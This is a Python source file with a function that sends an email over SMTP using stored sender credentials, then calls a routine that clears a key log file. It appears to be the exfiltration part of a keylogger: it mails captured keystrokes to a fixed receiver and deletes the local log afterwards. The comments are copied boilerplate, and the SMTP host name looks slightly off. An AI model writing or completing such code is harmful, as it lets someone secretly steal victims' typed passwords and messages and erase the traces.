import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import constant
import utilities


def send_email(subject, message):
    sender_email, sender_password, receiver_email = constant.sender_email, constant.sender_password, constant.receiver_email
    try:
        # Set up the SMTP server
        smtp_server = 'smtp.google.com'  # Replace 'smtp.example.com' with your SMTP server
        port = 587  # Port for sending email (587 is a common port for SMTP)

        # Create a secure SSL context
        context = ssl.create_default_context()

        # Create a message
        email_message = MIMEMultipart()
        email_message['From'] = sender_email
        email_message['To'] = receiver_email
        email_message['Subject'] = subject
        email_message.attach(MIMEText(message, 'plain'))

        # Connect to the SMTP server
        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls(context=context)  # Secure the connection
            server.login(sender_email, sender_password)  # Log in to the server
            server.sendmail(sender_email, receiver_email, email_message.as_string())  # Send the email
        print("Email sent successfully!")
        utilities.clear_key_log_file()
    except Exception as e:
        print("An error occurred while sending the email:", e)
